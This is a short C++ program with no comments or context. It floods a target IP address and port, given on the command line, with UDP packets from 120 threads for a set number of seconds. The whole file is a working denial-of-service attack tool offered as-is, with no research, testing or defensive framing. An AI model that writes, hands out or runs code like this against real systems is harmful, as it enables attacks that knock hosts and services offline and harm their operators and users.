#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
#include <thread>
#include <cstring>

void attack(std::string ip, int port, int time_s) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip.c_str());
    char data[1472]; 
    time_t end = time(NULL) + time_s;
    while(time(NULL) < end) {
        sendto(sock, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    close(sock);
}

int main(int argc, char** argv) {
    if(argc < 4) return 1;
    std::vector<std::thread> threads;
    for(int i=0; i<120; i++) threads.push_back(std::thread(attack, argv[1], std::stoi(argv[2]), std::stoi(argv[3])));
    for(auto &th : threads) th.join();
    return 0;
}
